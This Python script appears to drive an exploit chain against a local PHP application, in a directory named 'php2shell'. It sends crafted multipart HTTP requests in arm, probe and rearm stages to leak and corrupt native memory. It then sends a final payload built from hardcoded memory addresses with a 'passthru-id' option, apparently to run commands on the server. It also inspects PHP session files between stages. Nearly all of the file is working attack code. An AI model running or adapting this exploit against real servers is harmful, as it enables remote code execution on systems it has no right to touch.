#!/usr/bin/env python3
import importlib.util, socket, time
from pathlib import Path

def load(name, p):
    spec = importlib.util.spec_from_file_location(name, p)
    m = importlib.util.module_from_spec(spec); spec.loader.exec_module(m); return m

HERE = Path("/tmp/opencode/realapps/side/php2shell")
LEAK = load("leak", HERE / "native-output-leak.py")
STOCK = load("stock", HERE / "native-output-leak-stock-arm.py")
COMPACT = load("compact", HERE / "compact-stock-tail.py")
OUT = HERE / "runs" / "diag2"; OUT.mkdir(parents=True, exist_ok=True)
SESS = Path("/tmp/opencode/realapps/sessions/wiki")

host, port, path = "127.0.0.1", 28840, "/index.php"
header = f"{host}:{port}"; timeout = 60.0

def snap(tag):
    rows = sorted((p.name, p.stat().st_size) for p in SESS.glob("sess_*") if p.stat().st_size > 0)
    print(f"[{tag}] nonzero sess:", rows[:10])

def frame(sid, boundary, body, keep):
    return (b"POST " + path.encode() + b" HTTP/1.1\r\nHost: " + header.encode() +
        b"\r\n" + (b"Connection: keep-alive\r\n" if keep else b"Connection: close\r\n") +
        b"Cookie: PHPSESSID=" + sid + b"\r\n" +
        b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n" +
        b"Content-Length: " + str(len(body)).encode() + b"\r\n\r\n" + body)

arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
arm_req = LEAK.request_bytes(header, path, arm_body, None, 23, False)
c = socket.create_connection((host, port), timeout=timeout); c.settimeout(timeout)
c.sendall(arm_req); arm = LEAK.read_response(c.makefile("rb", buffering=0)); c.close()
(OUT/"arm-body.bin").write_bytes(arm[1])
print("arm:", arm[3], len(arm[1])); snap("after-arm")
for f in SESS.glob("sess_abcdefgh"):
    print("sess_abcdefgh:", f.read_bytes()[:220])
time.sleep(1.5); snap("after-arm+1.5s")

probe_body = LEAK.probe_body()
probe_req = LEAK.request_bytes(header, path, probe_body, b"", 64, True)
c2 = socket.create_connection((host, port), timeout=timeout); c2.settimeout(timeout)
c2.sendall(probe_req); probe = LEAK.read_response(c2.makefile("rb", buffering=0))
(OUT/"probe-body.bin").write_bytes(probe[1])
print("probe:", probe[3], len(probe[1])); snap("after-probe")

rearm_body = COMPACT.arm_body(False, COMPACT.ARM_FILENAME_LENGTH, 149)
rearm_req = frame(b"rearm0a", COMPACT.BOUNDARY, rearm_body, True)
c2.sendall(rearm_req); rearm = LEAK.read_response(c2.makefile("rb", buffering=0))
(OUT/"rearm-body.bin").write_bytes(rearm[1])
print("rearm:", rearm[3], len(rearm[1])); snap("after-rearm")

main = 0x7f6cd8600000
target = main + 0x6BB80; stage = main + 0x850D8
final_body = COMPACT.probe_body(100,39,39,11,True,2,8000,6000,False,True,
                                target, main - 0x296DA4A00000, stage - target, 1, "passthru-id")
final_req = frame(b"rearm0b", COMPACT.BOUNDARY, final_body, False)
c2.close()
c3 = socket.create_connection((host, port), timeout=timeout); c3.settimeout(timeout)
c3.sendall(final_req); fin = LEAK.read_response(c3.makefile("rb", buffering=0)); c3.close()
(OUT/"final-body.bin").write_bytes(fin[1])
print("final:", fin[3], len(fin[1])); snap("after-final")
